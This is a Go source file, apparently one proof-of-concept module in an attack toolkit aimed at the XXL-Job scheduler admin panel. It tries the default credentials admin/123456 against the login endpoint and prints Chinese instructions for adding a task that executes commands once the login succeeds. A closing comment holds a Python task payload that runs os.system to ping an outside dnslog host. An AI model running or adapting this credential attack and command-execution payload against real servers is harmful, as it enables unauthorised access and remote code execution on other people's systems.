package pocs

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	newclient "xxl-job/newClient"
)

type WeekPassword struct {
	Target       string
	Proxy        string
	Timeout      int
	Headers      map[string]string
	UserName     string
	PassWord     string
	Login_Result Login_Result
}

type Login_Result struct {
	Code    int
	Msg     string
	Content string
}

func NewWeekPassword(taregt, proxy string) *WeekPassword {
	return &WeekPassword{
		Target:  taregt,
		Proxy:   proxy,
		Timeout: 20,
		Headers: map[string]string{
			"User-Agent":       newclient.ReturnUA(),
			"Accept":           "*/*",
			"Accept-Language":  "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Accept-Encoding":  "gzip, deflate",
			"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
			"X-Requested-With": "XMLHttpRequest",
		},
		UserName: "admin",
		PassWord: "123456",
	}
}

func (w *WeekPassword) Login() {
	data := fmt.Sprintf("userName=%s&password=%s", w.UserName, w.PassWord)
	t := newclient.Standar_URL(w.Target)
	var url string
	if strings.HasSuffix(t, "/") {
		url = t + "xxl-job-admin/login"
	} else {
		url = t + "/xxl-job-admin/login"
	}

	response, err := newclient.SendRequest("POST", url, w.Proxy, w.Timeout, strings.NewReader(data), w.Headers)
	if err != nil {
		return
	}
	defer response.Body.Close()

	decoder := json.NewDecoder(response.Body)

	if response.StatusCode == http.StatusOK {
		if err := decoder.Decode(&w.Login_Result); err != nil {
			return
		}
		if w.Login_Result.Code == 200 {
			r := fmt.Sprintf("[+] %s 存在弱口令:[%s:%s]", url, w.UserName, w.PassWord)
			fmt.Println(r)
			fmt.Println("[+] 登录查看执行器xxl-job-executor是否正常连接,选择任务管理模块,新增任务,执行命令!")
		} else {
			r := fmt.Sprintf("[-] %s 不存在弱口令!", url)
			fmt.Println(r)
		}
	} else if response.StatusCode == http.StatusNotFound {
		page404 := fmt.Sprintf("[!] %s 404 Not Found - page not found!", url)
		fmt.Println(page404)
	} else if response.StatusCode == http.StatusRequestTimeout {
		fmt.Println("request timeout!")
	} else {
		r := fmt.Sprintf("[-] %s HTTP request failed!", url)
		fmt.Println(r)
	}
}

// 500   http.StatusInternalServerError
// "glueType": "GLUE_PYTHON",
// "glueSource": "import os\nos.system('ping 5rpm7j.dnslog.cn')",
